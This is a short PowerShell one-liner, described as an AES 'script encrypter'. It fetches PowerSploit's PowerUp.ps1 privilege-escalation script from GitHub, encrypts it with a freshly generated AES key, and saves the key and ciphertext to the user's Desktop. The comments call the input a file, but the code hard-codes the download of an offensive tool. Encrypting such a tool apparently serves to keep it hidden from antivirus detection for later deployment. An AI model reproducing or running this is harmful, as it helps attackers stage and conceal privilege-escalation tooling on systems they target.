#One-Liner Powershell script encrypter that use AES
#INPUT: the file that we want to encrypt is saved in $unencryptedString
#OUTPUT: the encrypted file is saved in "$env:userprofile\Desktop\file"
$unencryptedString = (New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ');$aes = New-Object "System.Security.Cryptography.AesManaged";$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$aes.BlockSize = 128;$aes.KeySize = 256;$aes.GenerateKey();$key=[System.Convert]::ToBase64String($aes.Key);$key;$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString);$encryptor = $aes.CreateEncryptor();$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);[byte[]] $fullData = $aes.IV + $encryptedData;$aes.Dispose();$encryptedString = [System.Convert]::ToBase64String($fullData);[System.IO.File]::WriteAllText("$env:userprofile\desktop\file",$key+$encryptedString)
